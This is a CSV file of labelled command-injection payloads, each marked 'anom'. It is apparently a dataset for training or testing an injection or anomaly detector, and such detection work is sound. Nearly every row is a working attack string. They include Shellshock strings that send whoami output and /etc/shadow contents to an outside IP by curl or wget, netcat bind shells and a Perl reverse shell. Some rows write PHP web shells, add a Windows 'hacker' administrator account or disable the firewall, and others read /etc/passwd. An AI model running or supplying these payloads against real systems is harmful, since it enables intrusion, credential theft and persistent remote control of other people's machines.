payload,label
|| ,anom
| ,anom
; ,anom
',anom
"'""",anom
"
'",anom
& ,anom
&& ,anom
%0a,anom
%0a%0d,anom
%0Acat%20/etc/passwd,anom
%0Aid,anom
%0a id %0a,anom
%0Aid%0A,anom
%0a ping -i 30 127.0.0.1 %0a,anom
%0A/usr/bin/id,anom
%0A/usr/bin/id%0A,anom
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",anom
%20{${phpinfo()}},anom
%20{${sleep(20)}},anom
%20{${sleep(3)}},anom
a|id|,anom
a;id|,anom
a;id;,anom
a;id\n,anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",anom
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",anom
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",anom
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",anom
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",anom
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",anom
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",anom
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",anom
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",anom
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",anom
cat /etc/hosts,anom
$(`cat /etc/passwd`),anom
cat /etc/passwd,anom
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,anom
| curl http://crowdshield.com/.testing/rce.txt,anom
& curl http://crowdshield.com/.testing/rce.txt,anom
; curl https://crowdshield.com/.testing/rce_vuln.txt,anom
&& curl https://crowdshield.com/.testing/rce_vuln.txt,anom
curl https://crowdshield.com/.testing/rce_vuln.txt,anom
" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",anom
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",anom
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),anom
dir,anom
| dir,anom
; dir,anom
$(`dir`),anom
& dir,anom
&&dir,anom
&& dir,anom
| dir C:\,anom
; dir C:\,anom
& dir C:\,anom
&& dir C:\,anom
dir C:\,anom
| dir C:\Documents and Settings\*,anom
; dir C:\Documents and Settings\*,anom
& dir C:\Documents and Settings\*,anom
&& dir C:\Documents and Settings\*,anom
dir C:\Documents and Settings\*,anom
| dir C:\Users,anom
; dir C:\Users,anom
& dir C:\Users,anom
&& dir C:\Users,anom
dir C:\Users,anom
;echo%20'<script>alert(1)</script>',anom
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,anom
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",anom
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",anom
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",anom
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",anom
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",anom
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",anom
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",anom
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",anom
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",anom
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",anom
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",anom
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",anom
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",anom
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",anom
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",anom
;echo '<script>alert(1)</script>',anom
echo '<script>alert(1)</script>'// XXXXXXXXXXX,anom
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,anom
"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",anom
"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",anom
"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",anom
"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",anom
"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",anom
() { :;}; echo vulnerable 10,anom
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),anom
eval('ls'),anom
eval('pwd'),anom
eval('pwd');,anom
eval('sleep 5'),anom
eval('sleep 5');,anom
eval('whoami'),anom
eval('whoami');,anom
exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),anom
exec('ls'),anom
exec('pwd'),anom
exec('pwd');,anom
exec('sleep 5'),anom
exec('sleep 5');,anom
exec('whoami'),anom
exec('whoami');,anom
";{$_GET[""cmd""]}",anom
`id`,anom
|id,anom
| id,anom
;id,anom
;id|,anom
;id;,anom
& id,anom
&&id,anom
;id\n,anom
ifconfig,anom
| ifconfig,anom
; ifconfig,anom
& ifconfig,anom
&& ifconfig,anom
/index.html|id|,anom
ipconfig,anom
| ipconfig /all,anom
; ipconfig /all,anom
& ipconfig /all,anom
&& ipconfig /all,anom
ipconfig /all,anom
ls,anom
$(`ls`),anom
| ls -l /,anom
; ls -l /,anom
& ls -l /,anom
&& ls -l /,anom
ls -l /,anom
| ls -laR /etc,anom
; ls -laR /etc,anom
& ls -laR /etc,anom
&& ls -laR /etc,anom
| ls -laR /var/www,anom
; ls -laR /var/www,anom
& ls -laR /var/www,anom
&& ls -laR /var/www,anom
| ls -l /etc/,anom
; ls -l /etc/,anom
& ls -l /etc/,anom
&& ls -l /etc/,anom
ls -l /etc/,anom
ls -lh /etc/,anom
| ls -l /home/*,anom
; ls -l /home/*,anom
& ls -l /home/*,anom
&& ls -l /home/*,anom
ls -l /home/*,anom
*; ls -lhtR /var/www/,anom
| ls -l /tmp,anom
; ls -l /tmp,anom
& ls -l /tmp,anom
&& ls -l /tmp,anom
ls -l /tmp,anom
| ls -l /var/www/*,anom
; ls -l /var/www/*,anom
& ls -l /var/www/*,anom
&& ls -l /var/www/*,anom
ls -l /var/www/*,anom
"<!--#exec cmd=""/bin/cat /etc/passwd""-->",anom
"<!--#exec cmd=""/bin/cat /etc/shadow""-->",anom
"<!--#exec cmd=""/usr/bin/id;-->",anom
\n,anom
\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,anom
\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,anom
\n/bin/ls -al\n,anom
| nc -lvvp 4444 -e /bin/sh|,anom
; nc -lvvp 4444 -e /bin/sh;,anom
& nc -lvvp 4444 -e /bin/sh&,anom
&& nc -lvvp 4444 -e /bin/sh &,anom
nc -lvvp 4444 -e /bin/sh,anom
nc -lvvp 4445 -e /bin/sh &,anom
nc -lvvp 4446 -e /bin/sh|,anom
nc -lvvp 4447 -e /bin/sh;,anom
nc -lvvp 4448 -e /bin/sh&,anom
\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,anom
\necho INJECTX\nexit\n\033[2Asleep 5\n,anom
\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,anom
| net localgroup Administrators hacker /ADD,anom
; net localgroup Administrators hacker /ADD,anom
& net localgroup Administrators hacker /ADD,anom
&& net localgroup Administrators hacker /ADD,anom
net localgroup Administrators hacker /ADD,anom
| netsh firewall set opmode disable,anom
; netsh firewall set opmode disable,anom
& netsh firewall set opmode disable,anom
&& netsh firewall set opmode disable,anom
netsh firewall set opmode disable,anom
netstat,anom
;netstat -a;,anom
| netstat -an,anom
; netstat -an,anom
& netstat -an,anom
&& netstat -an,anom
netstat -an,anom
| net user hacker Password1 /ADD,anom
; net user hacker Password1 /ADD,anom
& net user hacker Password1 /ADD,anom
&& net user hacker Password1 /ADD,anom
net user hacker Password1 /ADD,anom
| net view,anom
; net view,anom
& net view,anom
&& net view,anom
net view,anom
\nid|,anom
\nid;,anom
\nid\n,anom
\n/usr/bin/id\n,anom
"perl -e 'print ""X""x1024'",anom
"|| perl -e 'print ""X""x16096'",anom
"| perl -e 'print ""X""x16096'",anom
"; perl -e 'print ""X""x16096'",anom
"& perl -e 'print ""X""x16096'",anom
"&& perl -e 'print ""X""x16096'",anom
"perl -e 'print ""X""x16384'",anom
"; perl -e 'print ""X""x2048'",anom
"& perl -e 'print ""X""x2048'",anom
"&& perl -e 'print ""X""x2048'",anom
"perl -e 'print ""X""x2048'",anom
"|| perl -e 'print ""X""x4096'",anom
"| perl -e 'print ""X""x4096'",anom
"; perl -e 'print ""X""x4096'",anom
"& perl -e 'print ""X""x4096'",anom
"&& perl -e 'print ""X""x4096'",anom
"perl -e 'print ""X""x4096'",anom
"|| perl -e 'print ""X""x8096'",anom
"| perl -e 'print ""X""x8096'",anom
"; perl -e 'print ""X""x8096'",anom
"&& perl -e 'print ""X""x8096'",anom
"perl -e 'print ""X""x8192'",anom
"perl -e 'print ""X""x81920'",anom
|| phpinfo(),anom
| phpinfo(),anom
 {${phpinfo()}},anom
;phpinfo(),anom
;phpinfo();//,anom
';phpinfo();//,anom
{${phpinfo()}},anom
& phpinfo(),anom
&& phpinfo(),anom
phpinfo(),anom
phpinfo();,anom
"<?php system(""cat /etc/passwd"");?>",anom
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",anom
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",anom
